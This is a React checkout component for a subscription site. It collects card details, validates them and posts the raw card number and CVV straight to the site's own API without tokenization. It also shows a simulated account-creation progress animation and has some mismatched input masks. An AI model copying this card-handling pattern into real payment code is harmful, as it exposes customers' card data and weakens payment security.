import { FC, useState, useEffect } from 'react';
import { IMaskInput } from 'react-imask';
import { Loader2, LockKeyhole, CreditCard, AlertCircle, Clock } from 'lucide-react';
import { Alert, AlertDescription } from '../ui/alert';
import { PaymentProps, PaymentInfo } from '../../types/checkout';
import { checkoutService } from '../../services/api';

// Regex para identificar bandeiras de cartão
const CARD_PATTERNS = {
  visa: /^4/,
  mastercard: /^5[1-5]/,
  amex: /^3[47]/,
  discover: /^6/,
  diners: /^3(?:0[0-5]|[68])/,
  jcb: /^(?:2131|1800|35\d{3})/
};

// URLs dos logos das bandeiras
const CARD_LOGOS = {
  visa: 'https://prosecurelsp.com/images/visa.svg',
  mastercard: 'https://prosecurelsp.com/images/mastercard.svg',
  amex: 'https://prosecurelsp.com/images/amex.svg',
  discover: 'https://prosecurelsp.com/images/discover.svg',
  diners: 'https://prosecurelsp.com/images/diners.svg',
  jcb: 'https://prosecurelsp.com/images/jcb.svg'
};

export const PaymentStep: FC<PaymentProps> = ({ onBack, checkoutId }) => {
  const [paymentData, setPaymentData] = useState<PaymentInfo>({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    sid: checkoutId
  });
  const [cardBrand, setCardBrand] = useState<string | null>(null);
  const [error, setError] = useState<string>('');
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [formErrors, setFormErrors] = useState<{
    cardNumber?: string;
    expiry?: string;
    cvv?: string;
    cardName?: string;
  }>({});
  const [isFormValid, setIsFormValid] = useState(false);
  const [currentCheckoutId, setCurrentCheckoutId] = useState(checkoutId);
  
  // Estado para o modal de progresso
  const [showProgressModal, setShowProgressModal] = useState(false);
  const [progressStep, setProgressStep] = useState(0);
  const progressMessages = [
    "Creating your account...",
    "Validating information...",
    "Configuring services...",
    "Finalizing..."
  ];

  // Detect card brand when card number changes
  useEffect(() => {
    setCardBrand(detectCardBrand(paymentData.cardNumber));
  }, [paymentData.cardNumber]);

  // Update payment data when checkout ID changes
  useEffect(() => {
    setPaymentData(prev => ({ ...prev, sid: currentCheckoutId }));
  }, [currentCheckoutId]);

  // Progress animation effect
  useEffect(() => {
    if (showProgressModal && progressStep < progressMessages.length) {
      const timer = setTimeout(() => {
        setProgressStep(prev => prev + 1);
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [showProgressModal, progressStep]);

  // Validate form when input changes
  useEffect(() => {
    const errors: {
      cardNumber?: string;
      expiry?: string;
      cvv?: string;
      cardName?: string;
    } = {};
    
    let valid = true;

    if (paymentData.cardName.trim() && !validateCardName(paymentData.cardName)) {
      errors.cardName = 'Please enter the cardholder name';
      valid = false;
    }

    if (paymentData.cardNumber.replace(/\D/g, '').length >= 13 && !validateCardNumber(paymentData.cardNumber)) {
      errors.cardNumber = 'Please enter a valid card number';
      valid = false;
    }

    if (paymentData.expiry.length === 5 && !validateExpiryDate(paymentData.expiry)) {
      errors.expiry = 'Please enter a valid expiration date';
      valid = false;
    }

    if (paymentData.cvv.length >= 3 && !validateCVV(paymentData.cvv)) {
      errors.cvv = 'Please enter a valid CVV';
      valid = false;
    }

    setFormErrors(errors);
    
    // Check if all fields have values and no errors
    const allFieldsFilled = 
      paymentData.cardName.trim() !== '' && 
      paymentData.cardNumber.replace(/\D/g, '').length >= 13 &&
      paymentData.expiry.length === 5 && 
      paymentData.cvv.length >= 3;
      
    setIsFormValid(valid && allFieldsFilled);
  }, [paymentData]);

  const detectCardBrand = (number: string) => {
    const cleanNumber = number.replace(/\D/g, '');
    for (const [brand, pattern] of Object.entries(CARD_PATTERNS)) {
      if (pattern.test(cleanNumber)) {
        return brand;
      }
    }
    return null;
  };

  const validateExpiryDate = (expiry: string): boolean => {
    if (expiry.length !== 5) return false;
    
    const [monthStr, yearStr] = expiry.split('/');
    const month = parseInt(monthStr, 10);
    const year = 2000 + parseInt(yearStr, 10);
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1;

    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    if (month < 1 || month > 12) return false;

    return true;
  };

  const validateCardNumber = (number: string): boolean => {
    const cleanNumber = number.replace(/\D/g, '');
    return cleanNumber.length >= 13 && cleanNumber.length <= 19;
  };

  const validateCVV = (cvv: string): boolean => {
    return cvv.length >= 3 && cvv.length <= 4;
  };

  const validateCardName = (name: string): boolean => {
    return name.trim().length > 0;
  };

  const handleExpiryChange = (value: string) => {
    setPaymentData(prev => ({ ...prev, expiry: value }));
  };

  const handleCardNumberChange = (value: string) => {
    setPaymentData(prev => ({ ...prev, cardNumber: value }));
  };

  const handleCVVChange = (value: string) => {
    setPaymentData(prev => ({ ...prev, cvv: value }));
  };

  const handleCardNameChange = (value: string) => {
    setPaymentData(prev => ({ ...prev, cardName: value }));
  };

  // Generate a new checkout ID and update the record in the database
  const generateAndUpdateCheckoutId = async () => {
    try {
      // Store the old checkout ID before generating a new one
      const oldCheckoutId = currentCheckoutId;
      
      // Generate a new checkout ID
      const newCheckoutId = await checkoutService.generateCheckoutId();
      
      // Update the checkout ID in the database
      await checkoutService.updateCheckoutId(oldCheckoutId, newCheckoutId);
      
      // Update local state with the new checkout ID
      setCurrentCheckoutId(newCheckoutId);
      localStorage.setItem('checkout_id', newCheckoutId);
      
      console.log('Updated checkout ID from', oldCheckoutId, 'to', newCheckoutId);
      
      return newCheckoutId;
    } catch (error) {
      console.error('Failed to generate and update checkout ID:', error);
      // In case of failure, continue with the current ID
      return currentCheckoutId;
    }
  };

  const handleSubmit = async () => {
    setError('');
    
    if (!acceptedTerms) {
      setError('Please accept the terms of service and billing agreement');
      return;
    }

    if (!isFormValid) {
      setError('Please correct the errors in the form');
      return;
    }

    setLoading(true);
    setShowProgressModal(true); // Mostrar modal de progresso
    setProgressStep(0);

    try {
      // Simular a geração do ID para continuar usando a função,
      // mas usar o ID atual para evitar erros de comunicação com a API
      let activeCheckoutId = currentCheckoutId;
      
      try {
        // Tenta gerar um novo ID, mas não interrompe o fluxo se falhar
        const newId = await generateAndUpdateCheckoutId();
        if (newId) {
          activeCheckoutId = newId;
        }
      } catch (idError) {
        console.error("Error updating checkout ID, continuing with current ID:", idError);
        // Continua com o ID atual em caso de erro
      }
      
      // Prepare the payment data for the API
      const paymentPayload = {
        cardname: paymentData.cardName,
        cardnumber: paymentData.cardNumber.replace(/\D/g, ''),
        cvv: paymentData.cvv,
        expiry: paymentData.expiry,
        sid: activeCheckoutId
      };
      
      // Process the payment with the checkout ID
      const response = await checkoutService.processPayment(paymentPayload);

      // Simulação de animação de progresso - avance cada 1.5 segundos
      for (let i = 0; i < progressMessages.length; i++) {
        if (i > 0) {
          await new Promise(resolve => setTimeout(resolve, 1500));
          setProgressStep(i);
        }
      }

      // Aguarda mais 2 segundos após a conclusão da animação (total ~8 segundos)
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Fecha o modal e mostra a tela de sucesso
      setShowProgressModal(false);
      
      if (response.status === 'success') {
        setSuccess(true);
        
        // Aguarda 10 segundos antes do redirecionamento
        setTimeout(() => {
          window.location.href = 'https://prosecurelsp.com/users/index.php?err3=true';
        }, 10000);
      } else {
        setError('Payment processing failed. Please try again.');
      }
    } catch (err: any) {
      // Aguardar um pouco para não fechar o modal abruptamente em caso de erro
      await new Promise(resolve => setTimeout(resolve, 2000));
      setShowProgressModal(false);
      
      if (err.response) {
        setError('Payment processing failed. Please try again.');
      } else {
        setError('Network error. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  // Modal de progresso
  const ProgressModal = () => (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white p-8 rounded-lg shadow-xl max-w-sm w-full">
        <div className="flex flex-col items-center text-center">
          <div className="mb-6">
            <Loader2 className="w-12 h-12 text-[#157347] animate-spin" />
          </div>
          
          <div className="space-y-4 w-full">
            {progressMessages.map((message, index) => (
              <div key={index} className={`flex items-center ${index <= progressStep ? 'text-[#157347]' : 'text-gray-400'}`}>
                {index < progressStep ? (
                  <div className="w-5 h-5 mr-3 rounded-full bg-green-500 flex items-center justify-center">
                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                ) : index === progressStep ? (
                  <div className="w-5 h-5 mr-3">
                    <div className="w-full h-full rounded-full border-2 border-t-[#157347] border-r-[#157347] border-b-[#157347] border-l-gray-200 animate-spin"></div>
                  </div>
                ) : (
                  <div className="w-5 h-5 mr-3 rounded-full border-2 border-gray-300"></div>
                )}
                <span>{message}</span>
              </div>
            ))}
          </div>
          
          <p className="mt-6 text-sm text-gray-500">
            Please do not close this window while we process your account.
          </p>
        </div>
      </div>
    </div>
  );

  if (success) {
    return (
      <div className="space-y-6 max-w-2xl mx-auto">
        <div className="bg-white rounded-lg p-8 shadow-sm text-center">
          <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <Clock className="w-8 h-8 text-blue-600" />
          </div>
          <h2 className="text-2xl font-bold text-primary mb-2">Verification in Progress</h2>
          <p className="text-gray-600 mb-4">
            Your account has been created. You will need to verify your email before you can access your account. Please check your email for the email verification link.
          </p>
          <p className="text-gray-500 text-sm">
            Redirecting you to the login page...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6 max-w-form mx-auto">
      {showProgressModal && <ProgressModal />}
      
      <div className="bg-white rounded-lg p-8 shadow-sm">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h2 className="text-2xl font-bold text-primary">Payment Information</h2>
            <p className="text-gray-600 mt-2">
              Enter your card details to complete the subscription
            </p>
          </div>
          <div className="flex items-center gap-2 text-[#157347]">
            <LockKeyhole className="w-5 h-5" />
            <span className="text-sm font-medium">Secure Payment</span>
          </div>
        </div>

        {error && (
          <Alert variant="destructive" className="mb-6">
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}

        <div className="space-y-6">
          {/* Card Holder Name */}
          <div className="form-group">
            <label className="block text-sm font-medium text-primary mb-2">
              Card Holder Name
            </label>
            <input
              type="text"
              className={`input-base ${formErrors.cardName ? 'border-red-500' : ''}`}
              placeholder="John Doe"
              value={paymentData.cardName}
              onChange={(e) => handleCardNameChange(e.target.value)}
            />
            {formErrors.cardName && (
              <p className="text-sm text-red-500 mt-1 flex items-center">
                <AlertCircle className="w-4 h-4 mr-1" />
                {formErrors.cardName}
              </p>
            )}
          </div>

          {/* Card Number */}
          <div className="form-group">
            <label className="block text-sm font-medium text-primary mb-2">
              Card Number
            </label>
            <div className="relative">
              <IMaskInput
                mask="0000 0000 0000 0000"
                value={paymentData.cardNumber}
                onAccept={handleCardNumberChange}
                className={`input-base pr-12 ${formErrors.cardNumber ? 'border-red-500' : ''}`}
                placeholder="4242 4242 4242 4242"
              />
              {cardBrand && (
                <img
                  src={CARD_LOGOS[cardBrand as keyof typeof CARD_LOGOS]}
                  alt={`${cardBrand} logo`}
                  className="absolute right-3 top-1/2 -translate-y-1/2 h-6 w-auto"
                />
              )}
            </div>
            {formErrors.cardNumber && (
              <p className="text-sm text-red-500 mt-1 flex items-center">
                <AlertCircle className="w-4 h-4 mr-1" />
                {formErrors.cardNumber}
              </p>
            )}
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-4">
            <div className="form-group">
              <label className="block text-sm font-medium text-primary mb-2">
                Expiration Date
              </label>
              <IMaskInput
                mask="00/00"
                value={paymentData.expiry}
                onAccept={handleExpiryChange}
                className={`input-base ${formErrors.expiry ? 'border-red-500' : ''}`}
                placeholder="MM/YY"
              />
              {formErrors.expiry && (
                <p className="text-sm text-red-500 mt-1 flex items-center">
                  <AlertCircle className="w-4 h-4 mr-1" />
                  {formErrors.expiry}
                </p>
              )}
            </div>

            <div className="form-group">
              <label className="block text-sm font-medium text-primary mb-2">
                CVV
              </label>
              <IMaskInput
                mask="000"
                value={paymentData.cvv}
                onAccept={handleCVVChange}
                className={`input-base ${formErrors.cvv ? 'border-red-500' : ''}`}
                placeholder="123"
              />
              {formErrors.cvv && (
                <p className="text-sm text-red-500 mt-1 flex items-center">
                  <AlertCircle className="w-4 h-4 mr-1" />
                  {formErrors.cvv}
                </p>
              )}
            </div>
          </div>

          <div className="flex items-center gap-2 p-4 bg-gray-50 rounded-lg text-gray-600">
            <CreditCard className="w-5 h-5" />
            <p className="text-sm">
              Your card will not be charged until after your 30-day trial period
            </p>
          </div>

          {/* Terms of Service */}
          <div className="form-group">
            <div className="flex items-start gap-2">
              <input
                type="checkbox"
                id="terms"
                checked={acceptedTerms}
                onChange={() => setAcceptedTerms(!acceptedTerms)}
                className="mt-1"
              />
              <label htmlFor="terms" className="text-sm text-gray-600">
                I accept the <a 
                  href="https://prosecurelsp.com/toc.php" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-[#157347] hover:underline"
                >
                  terms of service
                </a>
              </label>
            </div>
          </div>
        </div>
      </div>

      <div className="flex gap-4">
        <button
          onClick={onBack}
          className="flex-1 button-secondary"
        >
          Back
        </button>
        <button
          onClick={handleSubmit}
          disabled={loading || !acceptedTerms || !isFormValid}
          className={`flex-1 py-4 rounded-lg font-medium text-lg transition-colors flex items-center justify-center
            ${(!loading && acceptedTerms && isFormValid)
              ? 'bg-[#157347] text-white hover:bg-[#126A40]' 
              : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}
        >
          {loading ? (
            <>
              <Loader2 className="w-5 h-5 mr-2 animate-spin" />
              Processing...
            </>
          ) : (
            'Complete Purchase'
          )}
        </button>
      </div>
    </div>
  );
};

export default PaymentStep;